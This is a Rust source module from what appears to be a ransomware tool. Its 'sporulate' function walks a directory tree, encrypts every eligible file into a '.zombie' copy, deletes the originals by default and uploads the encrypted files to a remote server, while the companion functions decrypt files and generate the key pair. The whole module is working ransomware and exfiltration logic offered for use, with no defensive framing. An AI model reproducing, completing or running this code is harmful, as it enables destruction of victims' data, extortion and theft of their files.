//! A module for recursively walking a directory tree, processing
//! files (encrypt, decrypt, exfiltrate), and deleting original files.

use std::{
    collections::HashSet,
    fs::{self, File},
    io::Write,
    path::Path,
    sync::LazyLock,
};

use log::{debug, error, info};
use reqwest::Client;
use walkdir::WalkDir;

use crate::{
    crypto::{
        EXTENSION, b64_decode, b64_encode, decrypt, encrypt, generate_keypair, load_private_key,
        load_public_key,
    },
    error::{AppError, CryptoError},
    net::upload_file,
};

// Slices are used here for performance and to avoid specifying array size at
// compile time. This avoids heap allocation (Vec).
/// Permanent, read-only lists that contain permanent, read-only string
/// references
const EXCLUDED_DIRS: &[&str] = &[
    ".git",
    ".svn",
    "node_modules",
    "target",
    "__pycache__",
    ".idea",
    ".vscode",
    ".Spotlight-V100",
    ".Trashes",
    ".fseventsd",
];
const EXCLUDED_FILES: &[&str] = &[
    ".zombie",
    ".DS_Store",
    ".AppleDouble",
    ".LSOverride",
    ".VolumeIcon.icns",
    ".apdisk",
    ".metadata_never_index",
    ".dmg",
    ".pkg",
    ".tmp",
    ".bak",
    ".swp",
    ".swo",
];

/// Pre-computed HashSet for excluded directories - initialized once
static EXCLUDED_DIRS_SET: LazyLock<HashSet<&'static str>> =
    LazyLock::new(|| EXCLUDED_DIRS.iter().copied().collect());

/// Pre-computed HashSet for excluded files - initialized once
static EXCLUDED_FILES_SET: LazyLock<HashSet<&'static str>> =
    LazyLock::new(|| EXCLUDED_FILES.iter().copied().collect());

/// Walks a directory tree starting from `path`, excluding directories
/// and files based on predefined lists, and encrypts and exfiltrates
/// files. It's like a spores burst--sporulate.
///
/// # Arguments
/// - `path`: The starting directory.
/// - `key`: Path to the main public key for encryption.
/// - `no_delete`: If true, the original file is not deleted after encryption.
/// - `server`: String representing the target server, like `http://server:2673`
///
/// # Logic
/// Uses `HashSet` for efficient lookups of excluded names.
/// Iterates through the file system, and for each valid file:
///   - Encrypts the file generating a `.zombie` version
///   - Sends the encrypted file to the target server
///   - Optionally, deletes the original file locally
///
/// # Returns
/// Returns a unit type if finished with success or an AppError if it fails.
///
/// # TODO
/// 1. Waiting for a file upload before start the next encryption is a
///    bottleneck. I could leverage `tokio` to upload files concurrently.
/// 2. I could add parallelism/concurrency to encrypt files.
#[tokio::main]
pub async fn sporulate(
    path: &Path,
    key: &Path,
    no_delete: bool,
    server: &Option<String>,
) -> Result<(), AppError> {
    let public_key = load_public_key(key)?;
    debug!("Loaded public key from {:?}", key);

    let client = Client::new();
    let mut has_errors = false;

    // Create a lazy iterator that traverses the directory tree, filtering out
    // excluded entries and errors.
    let walker = WalkDir::new(path)
        .into_iter()
        .filter_entry(|entry| {
            let file_name = entry.file_name();
            let file_path = entry.path();

            if entry.file_type().is_dir()
                && let Some(file_name) = file_name.to_str()
                && EXCLUDED_DIRS_SET.contains(file_name)
            {
                debug!("Skipping folder {}", file_path.display());
                return false;
            }

            if entry.file_type().is_file() {
                let path = entry.path();
                let file_name_str = path.file_name().and_then(|name| name.to_str());

                // Check filename directly
                if file_name_str.is_some_and(|name| EXCLUDED_FILES_SET.contains(name)) {
                    debug!("Skipping file {}", file_path.display());
                    return false;
                }

                // Check extension with optimized string handling
                if let Some(ext_str) = path.extension().and_then(|ext| ext.to_str()) {
                    let mut ext_with_dot = String::with_capacity(ext_str.len() + 1);
                    ext_with_dot.push('.');
                    ext_with_dot.push_str(ext_str);
                    if EXCLUDED_FILES_SET.contains(ext_with_dot.as_str()) {
                        debug!("Skipping file {}", file_path.display());
                        return false;
                    }
                }
            }
            true
        })
        .filter_map(Result::ok)
        .filter(|entry| entry.file_type().is_file());

    // Consuming the iterator triggers the file system scan.
    info!("Starting encryption process: path={:?}", path);
    for entry in walker {
        let file_path = entry.path();

        debug!("Encrypting file: {:?}", file_path);
        let zombie = match encrypt(file_path, &public_key) {
            Ok(zombie) => zombie,
            Err(e) => {
                error!("Failed to encrypt file {:?}: {}", file_path, e);
                has_errors = true;
                continue;
            }
        };

        if !no_delete {
            debug!("Deleting original file: {:?}", file_path);
            if let Err(e) = fs::remove_file(file_path) {
                error!("Failed to delete file {:?}: {}", file_path, e);
                has_errors = true;
                continue;
            }
        }

        if let Some(address) = server {
            debug!("Exfiltrating file: {:?}", zombie);
            if let Err(e) = upload_file(&client, address, &zombie).await {
                error!("Failed to exfiltrate file {:?}: {}", &zombie, e);
                has_errors = true;
                continue;
            }
        }
    }

    if has_errors {
        Err(AppError::PartialFailure)
    } else {
        info!("Encryption process completed successfully");
        Ok(())
    }
}

/// Traverses a directory tree starting from `path`, looking for `.zombie`
/// files to decrypt them. Iterates through the file system, finds `.zombie`
/// files, and calls the decryption routine for each one.
///
/// # Arguments
/// - `path`: The starting directory.
/// - `key`: Path to the main private key for decryption.
/// - `no_delete`: If true, the `.zombie` file is not deleted after decryption.
///
/// # Returns
/// Returns a unity type for success or an AppError on the contrary.
///
/// # TODO
/// 1. Implement concurrency/parallelism to decrypt files faster.
pub fn disinfect(path: &Path, key: &Path, no_delete: bool) -> Result<(), AppError> {
    let private_key = load_private_key(key)?;
    debug!("Loaded main private key from {:?}", key);

    let mut has_errors = false;

    // Create a lazy iterator that finds all `.zombie` files.
    let walker = WalkDir::new(path)
        .into_iter()
        .filter_map(Result::ok)
        .filter(|entry| {
            entry.file_type().is_file()
                && entry.path().extension().and_then(|ext| ext.to_str()) == Some(EXTENSION)
        });

    info!(
        "Starting decryption process: path={:?}, key={:?}",
        path, &key
    );
    for entry in walker {
        let file_path = entry.path();

        debug!("Decrypting file: {:?}", file_path);
        if let Err(e) = decrypt(file_path, &private_key) {
            error!("Failed to decrypt file {:?}: {}", file_path, e);
            has_errors = true;
            continue;
        }

        if !no_delete {
            debug!("Deleting .zombie file: {:?}", file_path);
            if let Err(e) = fs::remove_file(file_path) {
                error!("Failed to delete .zombie file {:?}: {}", file_path, e);
                has_errors = true;
                continue;
            }
        }
    }

    if has_errors {
        Err(AppError::PartialFailure)
    } else {
        info!("Decryption process completed successfully");
        Ok(())
    }
}

/// Generates a Curve25519 key pair and saves the Base64-encoded keys to the
/// specified path.
///
/// # Arguments
/// - `path`: The path to save the generated key pair named
///   `main-private.key` and `main-public.key`.
///
/// # Returns
/// A `Result` with a unit type on success of an AppError if the routine fails.
///
/// # TODO
/// 1. Add more context to the key files, like using JSON format.
pub fn germinate(path: &Path) -> Result<(), AppError> {
    let (private_key, public_key) = generate_keypair()?;

    let private_key_b64 = b64_encode(private_key.as_bytes());
    let private_key_path = path.join("main-private.key");

    let public_key_b64 = b64_encode(public_key.as_bytes());
    let public_key_path = path.join("main-public.key");

    let mut file = File::create(&private_key_path)?;
    file.write_all(private_key_b64.as_ref())?;
    info!("Main private key saved to: {:?}", private_key_path);

    let mut file = File::create(&public_key_path)?;
    file.write_all(public_key_b64.as_ref())?;
    info!("Main public key saved to: {:?}", public_key_path);

    // Verify that the encoded keys can be decoded correctly. This is a
    // sanity check to ensure the base64 encoding/decoding roundtrip works
    // as expected.
    let decoded_prikey = b64_decode(&private_key_b64)?;
    if decoded_prikey != *private_key.as_bytes() {
        return Err(AppError::Crypto(CryptoError::KeyVerification));
    }

    let decoded_pubkey = b64_decode(&public_key_b64)?;
    if decoded_pubkey != *public_key.as_bytes() {
        return Err(AppError::Crypto(CryptoError::KeyVerification));
    }

    Ok(())
}
